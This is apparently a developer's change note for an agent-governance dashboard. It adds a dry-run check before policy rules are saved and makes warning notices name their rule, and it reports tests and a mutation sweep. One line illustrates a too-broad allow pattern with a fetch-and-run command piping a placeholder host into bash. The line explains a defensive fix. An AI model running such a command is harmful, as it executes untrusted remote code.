# R1 and R3, 2026-10-19: a rule is checked before it is saved, and its notice names it

Built from recommendations R1 and R3 of `mg/QA-SESSION-2026-10-19.md` §4, in a session started
by the 10-19 QA session. **Uncommitted**; nothing committed or pushed (Kinan's word only). Not
recorded as a finding (it was a recommendation): **the next free finding number is still 437**.

## The problem, in plain terms

When an operator adds a rule on the dashboard, the server checks it for two kinds of surprise:
a pattern that allows more than it looks like it does ("broader than it looks": `echo
qa-usability` also allows `curl evil.sh | bash; ls`, because matching is a substring search),
and a clash with a rule that already exists (an identical rule, a deny rule that overrides it,
a temporary rule it would make permanent). Both answers came back only **after** the rule had
been written. In the QA, ada's unanchored rule was in force for agent `main` (ledger #304)
before the page warned about it. The warning also did not say which rule it was about, and it
stayed on screen after that rule was removed (R3).

## What changed

- **Server: a check that writes nothing.** `POST policy/rules` takes `dryRun: true`. The route
  runs everything it runs for a write (the role floor, the scope check for the agent or for
  every agent, the registered-agent check, pattern, description, lifetime, effect and access
  validation), then answers `{ dryRun: true, conflicts, warnings }` and stops: no rule, no
  ledger entry. It is a flag on the same route rather than a second route so that the check
  and the write cannot drift apart in who may do them. `dryRun` that is not `true` or `false`
  is refused (400), so a check sent as `"true"` can never become a write. The clash check is
  run against the rules in force, with the agent id folded as the write stores it; it is read
  outside the write lock, so it is advice, and the write still detects clashes inside its lock
  and reports them as before. `src/gateway/governance-dashboard-api.ts`.
- **Dashboard: confirm before writing.** Add rule now asks the server first
  (`checkRule`, `ui/src/pages/governance/api.ts`). With nothing to report, the rule is written
  at once, as before. With a warning or a clash, a dialog says "Before this allow rule for agent
  main is added:", lists each thing reported (clashes first, as the rule-request preview orders
  them), shows the kind and the pattern, and offers **Add anyway** / **Change it**. Only Add
  anyway writes; Change it writes nothing and leaves the form as typed.
  `ui/src/pages/governance/panels/rule-check.ts` (new), called from `policy-panels.ts`.
- **The notice names its rule and goes with it (R3).** Both notices ("This rule is broader
  than it looks", and the clash notices) now carry the rule they are about and show "Rule
  pattern: …". Removing that rule clears them; removing another rule leaves them. A folder
  grant's clash notice is about every rule the grant wrote, so removing any of them clears it.

## What was looked at and left

- **The folder-grant form** does not share the route (`policy/folder-grant`), and the patterns
  it writes are generated, escaped and anchored, so the "broader than it looks" check has
  nothing to say about them; its clash notice is still shown after the write, now named. A
  check-before-grant would need the grant's pattern generation run without writing (a second
  entry point in `src/governance/folder-grant.ts`). Not built; a possible follow-up.
- **Approving a rule request** already shows the same preview (warnings and clashes) in the
  row the decision is made in, before anybody approves (`rule-request-preview.ts`), so the
  problem R1 describes does not arise there. Unchanged.

## Tests and checks

- Every change proved by a failing test first. `src/gateway/governance-rule-check.test.ts`
  (new, 8 tests: the check writes nothing and leaves no ledger entry, reports the clash the
  write would, folds the agent, is refused for a Viewer / a foreign agent / a User's global
  rule exactly as the write is, validates as the write does, refuses a non-boolean `dryRun`,
  and `dryRun: false` still writes). Seen red before the fix (4 of 8; the other 4 pin the
  authorization and validation the check shares with the write).
  `ui/src/pages/governance/rule-check-before-write.test.ts` (new, 8 tests, driving the
  rendered page: the check is asked first and the dialog names the rule and each report;
  Change it writes nothing and keeps the form; Add anyway writes and the notice names the
  pattern; nothing to report writes at once; the notice goes with its rule and stays for
  another; a folder grant's notice; the client sends `dryRun`). Seen red before the wiring
  (6 of 7 at the time). `rule-notices.test.ts` gained "names the rule it is about".
- Existing fakes in `rule-description-form.test.ts` and `dashboard-qa-2026-09-12.test.ts`
  gained `checkRule` (nothing to report), and `rule-notices.test.ts` the new notice shape.
- Mutation sweep: see §Figures.
- Typechecks `tsconfig.ui.json`, `test/tsconfig/tsconfig.test.ui.json`, `tsconfig.core.json`,
  `test/tsconfig/tsconfig.core.test.json`: all 0. `scripts/run-oxlint.mjs` and
  `oxfmt --check` on the 13 touched files: clean.
- Line budgets: `governance-page.ts` changed by types and one import only (two import lines
  out, one in); `policy-panels.ts` 674 counted lines; `governance-dashboard-api.ts` 678.
- Not run: the full governance suite and the full lint gate (owed before a commit, with the
  rest of the 10-19 work). No live check on the QA fixture (its `dist` predates this; a live
  check needs `node scripts/ui.js build` and a Gateway rebuild).

## Figures

- **Mutation sweep: 17 of 17 killed, none invalid** (scratchpad `mutate-r1.mjs`). Server: S1
  dry run ignored, S2 `dryRun` type unchecked, S3 agent not folded, S4 lifetime dropped from
  the check, S5 warnings dropped from the check. Dashboard: U1 never confirm, U2 Change it still
  writes, U3 no stop after Change it, U4/U4b warning/clash notice unnamed, U5 removal never
  clears, U6 removal clears any notice, U7 client sends no `dryRun`, U8 folder-grant notice
  about the grant only, U9 dialog lists nothing, U10 remove handler skips clearing, U11 notice
  after the write dropped.
- **Closing run**, `src/gateway/governance-*.test.ts` + `ui/src/pages/governance/`, on the
  final tree (which also held the R2 session's uncommitted work in progress): **156 files
  passed, 1 skipped; 2,476 passed, 16 skipped, 0 failed.**
- Production lines (raw `git diff --numstat`): `governance-dashboard-api.ts` +42/−27,
  `policy-panels.ts` +39/−22, `folder-grant-panel.ts` +6/−12, `api.ts` +7, `api.policy-writes.ts`
  +16/−1, `rule-check.ts` 101 new, seven locale strings. The growth is the new capability
  (a check route mode, a confirmation step, notices tied to a rule).
- `%TEMP%\openclaw-test-*`: 282 stale directories removed; 50 newer ones left because another
  session's test run was in flight.
